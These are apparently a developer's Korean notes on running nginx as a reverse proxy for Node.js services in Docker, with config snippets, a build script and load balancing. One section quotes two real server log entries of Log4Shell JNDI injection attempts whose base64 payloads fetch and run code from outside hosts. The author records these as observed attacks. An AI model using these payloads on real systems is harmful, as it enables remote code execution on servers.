# 참고 
> url(nodejsSSO) : https://m.blog.naver.com/PostView.nhn?blogId=scw0531&logNo=221175584994&proxyReferer=https:%2F%2Fwww.google.com%2F <br/>
> url(Ag9Proxy) : https://daddyprogrammer.org/post/4245/angular2-httpclient-proxy/ <br/>

> url(dockerNet)   : https://phantasmicmeans.tistory.com/entry/Docker-Container-Network%EC%97%90-%EB%8C%80%ED%95%9C-%EC%9D%B4%ED%95%B4 <br/>
> url(localhost)   : https://velog.io/@lky9303/127.0.0.1-%EA%B3%BC-localhost%EC%9D%98-%EC%B0%A8%EC%9D%B4 <br/>
```
localhost와 127.0.0.1에 대한 짤막한 설명. 그냥, 홈페이지 접근시, URL접근이나 IP직접입력 접근이냐를 예제로 들어 설명하는거라 생각하면됨(정말대략적으로...)
```

## ngnix(Web)와 nodejs(Was) 연동
### 참고URL
> url(Ngnix) : https://myjamong.tistory.com/9 <br/>
> url(Ngnix) : https://velog.io/@jeff0720/2018-11-18-2111-%EC%9E%91%EC%84%B1%EB%90%A8-iojomvsf0n <br/>
> url(리버스프록시) : https://velog.io/@jakeseo_me/Node%EC%97%90%EC%84%9C-NGINX%EB%A5%BC-%EB%A6%AC%EB%B2%84%EC%8A%A4-%ED%94%84%EB%A1%9D%EC%8B%9C%EB%A1%9C-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0-%EB%B2%88%EC%97%AD <br/>

### 내용
> 예전에는 막연하다고 생각했는데, 의외로 설정이 간단하다. <br/>
> ng serve로 angular테스트시, proxy.json을 설정하는 경우가 있을 것이다. <br/>

```
ng serve --proxy-config proxy.json

// proxy.json 내용.
{
  "/api/*" : {
    "target" : "http://127.0.0.1:8011/",
    "secure" : false,
    "logLevel" : "debug"
  },
  
  "/mail/*" : {...블라블라...}
}

요런식으로 설정했었지...

```

> ngnix도 비슷하게 설정한다. <br/>
> 설치방법은 위의 링크를 참고하면 된다. <br/>
> (나는 docker로 설정하여, 스크립트에 집어넣던가 할 계획.) <br/>

```
// 이부분은 도커스크립트에 잘 넣어서 docker build시 적용되도록 한다.

// 대상파일
// .../nginx/conf/nginx.conf

// 변경부분

...
server {
  listen 80;
  server_name localhost;
  
  location /deal { ... }
  location /mail { ... }

}

// location 객체의 상세내용
// 1.
location /{블라블라} {
    proxy_set_header    Host $http_host;
    proxy_set_header    X-Real-IP $remote_addr;
    proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header    X-Forwarded-Proto $scheme;
    proxy_set_header    X-NginX-Proxy true;

    proxy_pass http://127.0.0.1:8001;
    proxy_redirect      off;
    charset utf-8;

}

// 2. 
location /{블라블라} {
    proxy_pass http://127.0.0.1:8001; # docker간의 프록시면 `172.17.0.1:포트`식으로 기술해야한다.
}


// 1.은 프록시 관련 헤더설정이 있는데, 커스텀헤더인지, 기본헤더인지 찾아봐야겠다.
// 가능하다면, 헤더에 SSO값을 넣어서 비 로그인시 접근을 차단해버리던가 해야지.


```

## nginx 세부세팅
### 참고URL
> https://extrememanual.net/9976 <br/>
> url(nginxDetail) : https://gigas-blog.tistory.com/233 <br/>

### 내용
```
nginx.conf에 좀 더 세부적으로 설정할 수 있는 내용.
```
#### server_tokens : off;
> https://goodgid.github.io/Nginx-Option-Server-Tokens/  
> http://millky.com/@origoni/post/1055  
> response에 서버 버젼을 노출여부를 결정하는 옵션.
> off시, 웹서버버젼이 노출되지 않는다.

|적용전(server_token:on)|적용후(server_token:off)|
|--|--|
|![image](https://user-images.githubusercontent.com/12105781/127770601-0d8ce980-3d63-435b-9288-f3fce0aeca24.png) | ![image](https://user-images.githubusercontent.com/12105781/127770616-79b8d0f7-6810-4d26-8e54-60d423df57fb.png) |


## docker N Nginx
### 참고URL
> url(dockerNgnix) : https://frontmulti.tistory.com/69 <br/>

### 내용
> URL을 참고해서 진행하지만, run을 하지 않고, <br/>
> create 및 build후 생긴 컨테이터ID를 기준으로 start을 진행한다.
>> 1. 쉘 스크립트 작성
```bash
homepath='/home/abcdefh'     # cd 입력시 들어가는 계정 최상위 경로.
workspace='devWorkspace'     # dev or real
projectName='webserver'      # bitcoinWebserver
dockerName='webserver_real'  # _dev or _real
timestamp=`date +%Y%m%d%H%M` # 현시간
listenport=80:80             # 리스닝포트

# 도커내 시간대 설정위한 작업
ln -sf /usr/share/zoneinfo/Asia/Seoul $homepath/etc/localtime
rm -rf $homepath/tmp/nginx

# 빌드를 위해 파일이 떨어지는 임시경로 설정
cd $homepath/workspace/$workspace/$projectName/
mkdir -p $homepath/tmp/nginx

cp -r * $homepath/tmp/nginx
cd $homepath/tmp/nginx

# dockerfile 분기처리
mv $homepath/tmp/nginx/Dockerfiles/Cloud/Dockerfile $homepath/tmp/nginx/Dockerfile

# build and Timezon Linking
# -v host경로 docker경로
# -v 경로는 절대경로를 삽입해야함.
## !주의 '\'로 이어지는 명령어 사이에 `#`같은 주석을 넣으면 쉘 실행시 에러남.
## (이어지던 명령어가 #을 기준으로 끊어져서 `-e`는 독립된 명령어로 인식함.)
docker build --tag auto/$dockerName:$timestamp .
docker create --name $dockerName -p $listenport \
 -v $homepath/log/nginx/:$homepath/log/nginx/ \
 -v $homepath/etc/localtime:/etc/localtime:ro \
-e TZ=Asia/Seoul \
auto/$dockerName:$timestamp 

echo '['$dockerName'] docker build complete.'
```

>> 2. dockerfile세팅
```docker
# 서버는 Dockerfile 이미지 사용
FROM nginx

# nginx.conf  : http 설정
# server.conf : server 설정
# 일단 띄우는게 목적이라면, 아래 두 COPY는 주석처리하고 진행.
COPY nginx_conf/nginx_http_real.conf   /etc/nginx/nginx.conf
COPY nginx_conf/nginx_server_real.conf /etc/nginx/conf.d/default.conf

# [21.08.01]
# default.conf의 경우, nginx.conf에서 include 처리되어 있어. 
# 사실상, default.conf에서 각 컨테이너에 대한 location 설정을 적용하고, nginx.conf는 크게 건들게 없어보인다.


ENV NODE_ENV production

ENV PORT 80
EXPOSE 80
```
>> 3. 쉘 실행 및 결과체크
```bash
[abcdefh@orderbitcoin Cloud]$ sh realBuild.sh
Sending build context to Docker daemon  10.75kB
Step 1/6 : FROM nginx
 ---> 08b152afcfae
Step 2/6 : WORKDIR /home/abcdefh/usr/tmp/nginx
 ---> Running in 94d84c367ed4
Removing intermediate container 94d84c367ed4
 ---> 73a9af37e27c
Step 3/6 : COPY . .
 ---> d38e1e62fa04
Step 4/6 : ENV NODE_ENV production
 ---> Running in 8c7455b7f1ce
Removing intermediate container 8c7455b7f1ce
 ---> 6c3962cbea43
Step 5/6 : ENV PORT 80
 ---> Running in c1c9ea37a864
Removing intermediate container c1c9ea37a864
 ---> d896c4994d6c
Step 6/6 : EXPOSE 80
 ---> Running in b6e09033a180
Removing intermediate container b6e09033a180
 ---> 2853f60cad90
Successfully built 2853f60cad90
Successfully tagged auto/webserver_real:202108010659
9647908b190e3e9d1e4afafd7a0bf897687ccbcf75f7bf8000b8a3e582cd6e70
```
>> 4. docker start `컨테이너ID` 시작
```cmd
docker start 9647 
```
>> 5. 완료 (컨테이너ID:9647...)
```cmd
CONTAINER ID   IMAGE                                      COMMAND                  CREATED          STATUS             PORTS                            NAMES
9647908b190e   auto/webserver_real:202108010659           "/docker-entrypoint.…"   23 seconds ago   Up 4 seconds       0.0.0.0:80->80/tcp        webserver_real
3af7e1a2572e   auto/autobit_fu_moni_real:202105311347     "docker-entrypoint.s…"   2 months ago     Up 2 days          0.0.0.0:9999->9999/tcp    autobit_fu_moni_real
```
<br/>

> 여기까지가 일단 도커를 통해 nginx를 설정하는 방법이다. <br/>
> 어떤URL로 들어오면 어디 컨테이너로 던져줄지를 설정해야하는데, 이는 관련 Git프로젝트에서 다룬다. <br/>

<br/>

> docker의 nginx세팅시, 주의할 점.  
> 들어온 URL에 따라 내부적으로 프록시 설정시. location의 proxy_pass를 `location / 127.0.0.1`이 포함된 경로로 설정하면 정상동작하지 않을 수 있다.  
> docker network구성에 따르면, 172.17.0.1이라는 gateway로 보내되, 포트별로 구분을 두어 프록시해야한다.  

```
# 예시.

server {
    ...
    
    # [21.08.01] 통계API 프록시
    # Common. docker로 구성시, localhost/127.0.0.1을 입력하면 접근을 못한다.
    # 실제, docker내부로 접속하여 해당컨터이너에 할당된 IP를 입력해야한다.
    location /statics {
        # proxy_pass http://127.0.0.1:8201/statics;  ==> docker가 아닌 현재 물리서버의 루프백        (동작안함)
        proxy_pass http://172.17.0.1:8201/statics;   ==> docker network (gateway에 해당하는)로 접근 (동작함)
        charset utf-8;
    }
    
    ...
    
}
    
```


## 서버 공격패턴
> 참고 https://tech.yeon.me/blog/%ec%9a%94%ec%a6%98-%ec%9e%90%ec%a3%bc-%eb%b3%b4%ec%9d%b4%eb%8a%94-%ec%9b%b9%ec%82%ac%ec%9d%b4%ed%8a%b8-%ea%b3%b5%ea%b2%a9-%ed%8c%a8%ed%84%b4/#comment-5  

클라우드 서버긴 하지만, 운영중에 있어 참고할 만한 내용같아서 링크만 남겨둔다.  
(실제 로그에서 봤던 내용도 있어,,, 요녀석들 참 집요하다 싶다.)  

 * 내 서버에도 이런로그가 발견되었다. 이런 하꼬서버에도 찾아주시는 분들이라니... 아쉽게도 IP로 접속하셔서 차단박았다.
 ```
195.54.160.149 - - [25/Dec/2021:02:27:48 +0900] "GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80MC44Ni4xNjkuNjc6NDQzfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzQwLjg2LjE2OS42Nzo0NDMpfGJhc2g=} HTTP/1.1" 400 230 "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80MC44Ni4xNjkuNjc6NDQzfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzQwLjg2LjE2OS42Nzo0NDMpfGJhc2g=}" "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80MC44Ni4xNjkuNjc6NDQzfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzQwLjg2LjE2OS42Nzo0NDMpfGJhc2g=}" "-"

18.221.182.245 - - [25/Dec/2021:06:56:39 +0900] "GET / HTTP/1.1" 400 248 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTguMjIyLjEyMi4yMjEvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8xOC4yMjIuMTIyLjIyMS9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTguMjIyLjEyMi4yMjEvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8xOC4yMjIuMTIyLjIyMS9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')" "-"

 ```
 

## 로드밸런싱 설정
> 참고 https://kamang-it.tistory.com/entry/WebServernginxnginx%EB%A1%9C-%EB%A1%9C%EB%93%9C%EB%B0%B8%EB%9F%B0%EC%8B%B1-%ED%95%98%EA%B8%B0  
생각보다 간단하다.  
향후, 로그인같은 기능만들면, 서버를 두대로 하거나, 아니면 docker 컨테이너를 두대를 띄우거나 하면 해당기능으로 로드밸런싱해도 되겠다.  
간단한 스크립트를 기술한다.  

```nginx
upstream loadbanance {
 ip_hash; # 로드밸런스 타입, 필요없으면 값 넣지말자. 그러면 기본인 라운드 로빈으로 밸런싱한다.
 server 192.168.0.2:8080;
 server 192.168.0.2:8090;
} 

server {
 listen 80;
 location /api/vi {
  proxy_pass http://loadbanance;  # upstream 이름을 넣는다. 
 }
}


